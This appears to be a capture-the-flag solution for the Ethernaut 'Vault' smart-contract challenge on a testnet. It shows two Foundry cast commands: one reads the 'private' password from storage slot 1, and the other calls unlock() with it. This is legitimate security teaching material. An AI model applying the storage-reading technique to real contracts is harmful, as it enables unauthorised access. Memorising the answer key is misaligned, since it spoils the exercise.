# Vault Solution

Retrieve the `password`:

```
cast storage `ìnstanceAddress` 0x1 --rpc-url $SEPOLIA_RPC_URL
```


Call the  `unlock()` function:

```
cast send `ìnstanceAddress` "unlock(bytes32)" `password` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
